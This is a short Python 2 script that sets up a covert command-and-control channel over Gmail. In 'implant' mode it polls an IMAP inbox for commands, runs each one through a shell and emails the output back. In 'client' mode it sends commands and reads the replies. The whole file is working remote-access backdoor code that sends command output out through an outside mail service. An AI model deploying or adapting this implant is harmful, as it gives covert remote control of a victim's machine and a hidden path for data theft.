#!/usr/bin/env python

import threading
import smtplib
import imaplib
import sys
import time
from subprocess import Popen, PIPE

if len(sys.argv) < 3:
	print "improper usage"
	print "%s implant|client <id>" % sys.argv[0]
	exit(1)
elif sys.argv[1] == "implant":
	state = "implant"
	state_r = "client"
elif sys.argv[1] == "client":
	state = "client"
	state_r = "implant"
id = sys.argv[2]

username = ''
passwd = ''

last = ''

def send(content):
	if content == None:
		return
	msg = 'SUBJECT: %s\n\n%s' % (id + ":" + state,content)

	server = smtplib.SMTP('smtp.gmail.com:587')
	server.ehlo()
	server.starttls()
	server.login(username,passwd)
	server.sendmail(username, username, msg)
	server.quit()
	
def execute(email):
	if not "com:" in email:
		return
	else:
		com = email.split("com:")[1].rstrip()
		print com
		process = Popen(com, stdout=PIPE, stderr=PIPE, shell=True)
		stdout, stderr = process.communicate()
		print stdout, stderr
		return stdout, stderr
	return "fail"

def c_read():
	last = ''
	while True:
		last = read(last)
		time.sleep(1)
	
def read(last):
	mail = imaplib.IMAP4_SSL('imap.gmail.com')
	mail.login(username, passwd)
	mail.list()
	mail.select("inbox")


	result, data = mail.search(None, '(FROM "%s" SUBJECT "%s:%s")' % (username, id, state_r))

	ids = data[0]
	id_list = ids.split()
	try:
		latest_email_id = id_list[-1]
	except:
		return
	result, data = mail.fetch(latest_email_id, "(RFC822)")

	raw_email = data[0][1]
	if raw_email == last:
		return raw_email
	print raw_email.split("SUBJECT")[1].split(state_r)[1]
	send(execute(raw_email))
	return raw_email

if __name__ == "__main__":
	if state == "implant":
		while True:
			last = read(last)
			time.sleep(1)
	elif state == "client":
		threads=[]
		t = threading.Thread(name='daemon', target=c_read)
		t.setDaemon(True)
		threads.append(t)
		t.start()
		while True:
			content = raw_input(" ")
			send("com:" + content)
			
